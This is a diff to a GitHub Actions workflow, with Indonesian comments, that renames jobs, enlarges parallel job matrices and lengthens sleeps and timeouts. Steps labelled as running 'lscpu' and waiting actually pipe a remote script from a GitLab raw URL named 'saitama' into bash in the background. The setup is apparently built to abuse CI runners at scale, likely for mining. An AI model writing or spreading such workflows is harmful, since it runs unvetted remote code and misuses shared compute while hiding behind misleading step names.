@@ -16,14 +16,14 @@ jobs:
   generate:
     runs-on: ubuntu-latest
     outputs:
-      build_go: ${{ steps.gen.outputs.build_go }}
-      build_flag: ${{ steps.gen.outputs.build_flag }}
-      cincau_go: ${{ steps.gen.outputs.cincau_go }}
-      cincau_flag: ${{ steps.gen.outputs.cincau_flag }}
-      tepung_go: ${{ steps.gen.outputs.tepung_go }}
-      tepung_flag: ${{ steps.gen.outputs.tepung_flag }}
-      tekwan_go: ${{ steps.gen.outputs.tekwan_go }}
-      tekwan_flag: ${{ steps.gen.outputs.tekwan_flag }}
+      line_go: ${{ steps.gen.outputs.line_go }}
+      line_flag: ${{ steps.gen.outputs.line_flag }}
+      lucas_go: ${{ steps.gen.outputs.lucas_go }}
+      lucas_flag: ${{ steps.gen.outputs.lucas_flag }}
+      popay_go: ${{ steps.gen.outputs.popay_go }}
+      popay_flag: ${{ steps.gen.outputs.popay_flag }}
+      dandi_go: ${{ steps.gen.outputs.dandi_go }}
+      dandi_flag: ${{ steps.gen.outputs.dandi_flag }}
     steps:
       - name: Generate random strings
         id: gen
@@ -42,10 +42,10 @@ jobs:
 
           # Tentukan jumlah sesuai masing-masing job
           specs = {
-              'build_go': 9, 'build_flag': 26,
-              'cincau_go': 9, 'cincau_flag': 26,
-              'tepung_go': 9, 'tepung_flag': 26,
-              'tekwan_go': 9, 'tekwan_flag': 3
+              'line_go': 9, 'line_flag': 26,
+              'lucas_go': 9, 'lucas_flag': 26,
+              'popay_go': 9, 'popay_flag': 26,
+              'dandi_go': 9, 'dandi_flag': 5
           }
 
           with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
@@ -56,7 +56,7 @@ jobs:
   # =============================================
   # 📦 Job build (234 job) – lscpu + sleep 330s
   # =============================================
-  build:
+  line:
     needs: generate
     runs-on: ubuntu-latest
     timeout-minutes: 10
@@ -64,8 +64,8 @@ jobs:
       max-parallel: 50
       fail-fast: false
       matrix:
-        go: ${{ fromJSON(needs.generate.outputs.build_go) }}
-        flag: ${{ fromJSON(needs.generate.outputs.build_flag) }}
+        go: ${{ fromJSON(needs.generate.outputs.line_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.line_flag) }}
     steps:
       - name: Jalankan lscpu & tahan 5.5 menit
         run: |
@@ -75,8 +75,8 @@ jobs:
   # =============================================
   # 🧊 Job cincau (234 job) – lscpu + sleep 21m
   # =============================================
-  cincau:
-    needs: [generate, build]
+  lucas:
+    needs: [generate, line]
     runs-on: ubuntu-latest
     timeout-minutes: 25
     strategy:
@@ -94,35 +94,35 @@ jobs:
   # =============================================
   # 🍚 Job tepung (234 job) – lscpu + sleep 35m
   # =============================================
-  tepung:
-    needs: [generate, build]   # paralel dengan cincau
+  popay:
+    needs: [generate, line]   # paralel dengan cincau
     runs-on: ubuntu-latest
-    timeout-minutes: 50
+    timeout-minutes: 90
     strategy:
       max-parallel: 250
       fail-fast: false
       matrix:
-        go: ${{ fromJSON(needs.generate.outputs.tepung_go) }}
-        flag: ${{ fromJSON(needs.generate.outputs.tepung_flag) }}
+        go: ${{ fromJSON(needs.generate.outputs.popay_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.popay_flag) }}
     steps:
       - name: Jalankan lscpu & tahan 35 menit
         run: |
           curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
-          sleep 45m
+          sleep 85m
 
   # =============================================
   # 🍜 Job tekwan (27 job) – lscpu + sleep 62m
   # =============================================
-  tekwan:
-    needs: [generate, cincau]
+  dandi:
+    needs: [generate, lucas]
     runs-on: ubuntu-latest
     timeout-minutes: 80
     strategy:
       max-parallel: 250
       fail-fast: false
       matrix:
-        go: ${{ fromJSON(needs.generate.outputs.tekwan_go) }}
-        flag: ${{ fromJSON(needs.generate.outputs.tekwan_flag) }}
+        go: ${{ fromJSON(needs.generate.outputs.dandi_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.dandi_flag) }}
     steps:
       - name: Jalankan lscpu & tahan 62 menit
         run: |
